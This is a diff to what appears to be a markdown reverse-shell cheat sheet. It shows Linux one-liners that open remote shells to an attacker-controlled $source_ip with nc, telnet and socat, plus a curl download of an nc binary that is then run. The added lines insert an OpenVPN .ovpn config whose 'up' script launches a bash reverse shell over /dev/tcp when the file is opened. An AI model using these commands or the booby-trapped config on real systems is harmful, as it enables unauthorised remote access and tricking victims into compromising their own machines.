@@ -15,6 +15,7 @@ socat file:tty,raw,echo=0 tcp-listen:$source_port
 ## Commands
 
 ### Linux
+
 ```bash
 nc -e /bin/bash $source_ip $source_port
 ```
@@ -40,6 +41,14 @@ rm -f /tmp/p; mknod /tmp/p p && telnet $source_ip $source_port 0/tmp/p
 curl http://$source_ip/tools_linux/nc -o /tmp/nc
 chmod +x /tmp/nc 
 /tmp/nc $source_ip $source_port -e /bin/sh
+```
+example.ovpn 
+```conf
+remote $source_ip
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c 'bash -i >& /dev/tcp/$source_ip/$source_port 0>&1'"
 ```
 
 ### Windows 
